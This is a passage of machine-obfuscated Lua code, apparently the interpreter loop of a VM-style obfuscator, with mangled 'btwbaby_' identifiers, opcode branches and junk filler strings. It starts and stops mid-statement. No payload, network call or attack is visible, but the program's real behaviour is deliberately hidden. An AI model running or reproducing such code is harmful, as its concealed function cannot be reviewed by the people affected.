l=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ho")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5as")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("L1")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("11e")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ls")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("o7i")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("N5")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("g3n")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{582;112;141;803};{808;659;141;829};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Z3K")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{43;901;376;863};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("NW")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("239")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("hzmb")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dp")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gOo")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lV")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uc8")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("jt2a")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{973;800;728;200};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mWT")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4Z")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5Nm")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eG")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("qVY")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Kl")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("BZL")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dV")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("OBG")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mOko")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("92")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7FJ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lX")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{620;594;65;449};{716;689;496;220};"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rPOC")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{112;883;894;498};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("MeM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("W7")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("82P")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("A3")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("kOy")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cu")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Rb6")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Pl")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("ev7")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("vq")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("cCv")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5MUX")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BI")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("HYs")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oC")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mQI")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("uPBE")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rK")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{714;118;411;567};{868;93;83;86};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{912;898;118;740};{133;971;457;507};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("iMP")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ea")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jqM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("6a")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("dtE")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("hh")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("JB7")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("iP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("6bl")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xsWV")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eH")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("TTP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cy")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("J7h")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("OxuA")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yN")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gx1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("02kG")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oV")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("dU9")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2T0A")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Pj")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qzi")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("cJ2H")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("MF")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Zv0")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oJ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uxi")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("FOzv")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("yJ")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("S2e")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GT")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("XYD")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mo")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("7F9")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ls")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("ji3")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xj")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("DV2")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{460;637;514;914};"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Vp")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("CF9")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("41AF")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AD")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("2At")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5toT")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wp")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("3CZ")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("cBoq")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sr")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZvV")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("MZbT")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PF")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rI5")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YApk")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("F3")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rKG")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XR")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("z6M")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("978v")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("HH")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("CjU")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ak")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ftt")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CN")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("2HB")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("v1")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("EfG")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("y0")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("PYx")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7E1L")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("lY")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("xQy")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("atuh")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZMH")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fX")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9Zi")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("StjK")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sI")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("YM5")];end;elseif btwbaby_IIlIllIIlIlIIlIIIl==#("yquZf6")then local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Gg")]local btwbaby_IIIllIlIIlI,btwbaby_llIIllIll=btwbaby_lIllllllIIllIIlIll(btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII](btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII+1]))btwbaby_lIlIIllIllIlIIlI=btwbaby_llIIllIll+btwbaby_IllIIIllIlIIIIIlIIIllII-1 local btwbaby_llIIllIll=0;for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII,btwbaby_lIlIIllIllIlIIlI do btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];end;else local btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wa")]btwbaby_llllIllI[btwbaby_llIIllIll]=btwbaby_llllIllI[btwbaby_llIIllIll](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_llIIllIll+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("SpQ")]))end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("7qDfpJYnbXz")then if btwbaby_IIlIllIIlIlIIlIIIl<=#("yQT9TcAvm")then if btwbaby_IIlIllIIlIlIIlIIIl>#("soCoRQSO")then do return end;else local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5o")]btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII](btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII+1])end;elseif btwbaby_IIlIllIIlIlIIlIIIl==#{"1 + 1 = 111";{24;901;742;887};{752;606;49;214};"1 + 1 = 111";"1 + 1 = 111";{952;436;492;447};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}then local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ga")]btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII](btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII+1])else local btwbaby_lIIIlIIIIllllIlIllllI;local btwbaby_llIIIlIlllll,btwbaby_IlIlIIllIIlIIIIllIIIIll;local btwbaby_IIlIllIIlIlIIlIIIl;local btwbaby_IIIlIlIIIIlllllIlIlIIlI;local btwbaby_llIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bu")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cIu")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xv")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hIV")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("dAiJ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("eaF")];btwbaby_IIIlIlIIIIlllllIlIlIIlI=btwbaby_llllIllI[btwbaby_llIlIIIl]for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_llIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("P1QP")]do btwbaby_IIIlIlIIIIlllllIlIlIIlI=btwbaby_IIIlIlIIIIlllllIlIlIIlI..btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII];end;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1q")]]=btwbaby_IIIlIlIIIIlllllIlIlIIlI;btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ys")]]={};btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{618;795;268;162};"1 + 1 = 111";}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("KYu")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("EMop")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PC")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("WZU")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ng")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("WCn")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("7v2F")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("P6")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 